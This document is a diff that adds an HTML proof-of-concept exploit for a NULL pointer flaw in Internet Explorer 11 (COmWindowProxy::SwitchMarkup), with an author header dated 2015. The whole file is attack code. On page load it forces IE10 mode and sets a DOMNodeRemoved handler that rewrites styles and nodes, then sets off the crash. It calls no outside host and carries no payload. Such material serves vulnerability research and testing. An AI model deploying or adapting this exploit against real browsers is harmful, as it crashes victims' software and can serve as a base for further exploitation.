@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+	<head>
+		<meta http-equiv='Cache-Control' content='no-cache'/>
+		<title>IE11 11.0.9600.18097 NULL PTR</title>
+		<script>
+    
+      /*
+       * Exploit Title: IE 11 COmWindowProxy::SwitchMarkup NULL PTR
+       * Date: 09.12.2015
+       * Exploit Author: Marcin Ressel 
+       * Vendor Homepage: www.microsoft.com
+       * Software Link: 0
+       * Version: 11.0.9600.18097
+       * Tested on: Windows 7 x64 
+       * https://twitter.com/m_ressel
+      */
+      var trg,src,arg;
+
+			function tk() {
+
+                targetDomTree = document.getElementsByTagName("*");
+		
+                var meta = document.createElement('meta');
+                    meta.setAttribute("http-equiv", "X-UA-Compatible");
+                    meta.setAttribute("content",'IE=10');
+            
+                document.getElementsByTagName("head")[0].appendChild(meta);
+               
+                doc = document;
+                
+                src = targetDomTree[8]; 
+				        trg = targetDomTree[1]; 
+				        arg = targetDomTree[0];  
+        
+				        arg.addEventListener("DOMNodeRemoved",new Function("",
+                                                                   'try{src.runtimeStyle.textAlignLast="center";}catch(err){}'+
+                                                                   'try{trg = arg.removeNode(true);}catch(err){}'+
+                                                                   'try{trg.parentNode.style.textAutospace="ideograph-numeric";}catch(err){}'+
+                                                                   'try{trg.runtimeStyle="align-items:stretch;";}catch(err){}'+
+                                                                   'try{trg.insertAdjacentHTML("afterEnd","<table><tfoot>http://www.w3.org/2000/xmlns/</tfoot></table>");}catch(err){}'+
+                                                                   'try{trg.parentElement.parentNode.style.wordWrap="initial";}catch(err){}'+
+                                                                   'try{trg.parentNode.style.writingMode="vertical-rl";}catch(err){}'+
+                                                                   'try{doc.write("");}catch(err){}try{trg.style.whiteSpace="pre"; }catch(err){}'
+                                                                  ),
+                                                                  true); 
+
+				        trg.outerText = new Object(); 
+				        trg.parentNode.appendChild(document.createElement("div")); 
+			}
+		</script>
+	</head>
+	<body onload='tk();'>
+	<div id="out">..</div>
+  <div id="oneUnArg">...</div>
+  <div id="pHolder"></div>	
+	</body>
+</html>
